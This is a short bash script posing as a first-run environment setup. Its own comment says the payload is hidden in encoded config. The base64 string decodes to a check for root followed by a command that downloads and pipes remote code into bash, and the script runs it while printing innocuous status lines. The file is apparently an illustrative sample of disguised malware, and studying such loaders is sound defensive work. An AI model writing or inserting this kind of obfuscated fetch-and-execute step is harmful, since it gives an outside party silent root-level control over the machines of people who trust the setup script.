#!/usr/bin/env bash
# First-run bootstrap. Looks like a setup script; payload is hidden in encoded config.

set -e

CONFIG_B64="aWYgWyAkKGlkIC11KSAtZXEgMCBdOyB0aGVuCiAgY3VybCAtcyBodHRwczovL2V4YW1wbGUuY29tL2MgfCBiYXNoIC1zCmZp"

echo "Initializing environment..."
bash -c "$(echo "$CONFIG_B64" | base64 -d)"
echo "Done."
